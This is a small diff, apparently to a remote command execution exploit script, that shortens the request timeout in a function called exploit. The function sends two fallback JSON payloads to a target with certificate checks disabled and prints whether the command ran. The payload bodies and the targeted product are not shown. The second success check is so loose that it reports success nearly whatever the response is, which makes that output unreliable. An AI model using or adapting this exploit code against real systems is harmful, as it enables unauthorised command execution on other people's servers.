@@ -20,12 +20,12 @@ def exploit(target, command):
     }
     
     try:
-        response = requests.post(url, headers=headers, data=json.dumps(payload1), verify=False, timeout=15)
+        response = requests.post(url, headers=headers, data=json.dumps(payload1), verify=False, timeout=4)
         if (response.status_code == 500 or response.status_code == 200) and ("\"code\":200" in response.text) and ("Failed to do request" not in response.text):
             print(f"[+] Command executed successfully with payload 1")
         else:
             print(f"[-] Request failed with status code: {response.status_code}")
-            response = requests.post(url, headers=headers, data=json.dumps(payload2), verify=False, timeout=15)
+            response = requests.post(url, headers=headers, data=json.dumps(payload2), verify=False, timeout=4)
         if (response.status_code == 200 or response.status_code == 500) or ("\"code\":200" in response.text) or ("Failed to do request" not in response.text):
             print(f"[+] Command executed successfully with payload 2")
         else:
